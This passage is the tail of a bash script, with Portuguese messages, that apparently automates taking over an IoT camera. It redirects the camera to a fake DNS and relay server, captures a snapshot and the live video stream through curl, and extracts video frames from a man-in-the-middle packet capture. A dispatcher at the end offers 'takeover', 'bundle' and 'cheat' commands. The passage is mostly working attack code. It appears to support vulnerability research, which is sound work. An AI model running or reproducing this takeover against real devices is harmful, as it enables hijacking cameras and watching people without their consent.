        curl -s --max-time 3 "http://$AP_IP/dev/list" -o "$OUT_DIR/takeover_${stamp}_devlist.json" 2>/dev/null || true
        if [[ -n "$id" ]]; then
          ok "  <id> do stream: $id"
          curl -s --max-time 8 "http://127.0.0.1/dev/$id/snapshot" -o "$snap" 2>/dev/null \
            && [[ -s "$snap" ]] && ok "  snapshot -> $snap" || { warn "  snapshot vazio/falhou"; rm -f "$snap"; }
          say "  capturando /live por ${STREAM_SECS}s ..."
          curl -s --max-time "$STREAM_SECS" "http://127.0.0.1/dev/$id/live" -o "$mjpg" 2>/dev/null || true
          [[ -s "$mjpg" ]] && ok "  live bruto -> $mjpg" || { warn "  /live nao rendeu bytes"; rm -f "$mjpg"; }
        else
          warn "  nao consegui o <id> (server.log sem 'registration request' e /dev/list vazio)."
          warn "  firmware novo as vezes nao completa o registro P2P — ver ressalva em achados_fakeserver.md"
        fi
        alive pcap && { sleep 1; stop_bg pcap; }
        if [[ -s "$pcap" ]]; then
          ok "  pcap -> $pcap"
          if have python3; then
            say "  extraindo frames do pcap ..."
            ( cd "$REPO_ROOT" && python3 "$UTILS_DIR/extract_mitm_video.py" "$pcap" --out "$OUT_DIR/takeover_${stamp}" ${cip:+--cam-ip "$cip"} ) 2>&1 | sed 's/^/    /' || warn "  extract_mitm_video falhou"
          fi
        fi
      else
        warn "  camera nao registrou no relay :${RELAY_PORT} do fake server (${P2P_WAIT}s)."
        warn "  Sem o registro P2P nao ha /dev/list nem stream — mas a Fase 7 (MQTT) ja e a prova de takeover."
        warn "  Confere se o fake server subiu na ${RELAY_PORT} e se a camera aponta pro DNS fake."
      fi
    else
      warn "  camera nao voltou em ${ONLINE_TIMEOUT}s — pula a Fase 8 (rode 'sudo $0 takeover --no-stream' de novo so pra ela)"
    fi
  fi

  stop_bg proof
  cp -f "$(log_of proof)" "$proof" 2>/dev/null || true
  cp -f "$sent_log" "$OUT_DIR/takeover_${stamp}_sent.log" 2>/dev/null || true

  say
  ok "takeover terminou. Artefatos:"
  ls -1 "$OUT_DIR"/takeover_"${stamp}"* 2>/dev/null | sed 's/^/    /'
  say "  junta tudo num arquivo:  sudo $0 bundle"
}

# --------------------------------------------------------------- main
case "${1:-}" in
  up)       shift; need_root; cmd_up "${1:-}" ;;
  down)     need_root; cmd_down ;;
  restart)  shift; need_root; cmd_down; echo; sleep 2; cmd_up "${1:-}" ;;
  status)   need_root; cmd_status ;;
  logs)     shift; need_root; cmd_logs "$@" ;;
  watch)    shift; need_root; cmd_watch "$@" ;;
  takeover) shift; need_root; cmd_takeover "$@" ;;
  bundle)   need_root; cmd_bundle ;;
  cheat)    cmd_cheat ;;
  *)        usage; exit 1 ;;
esac
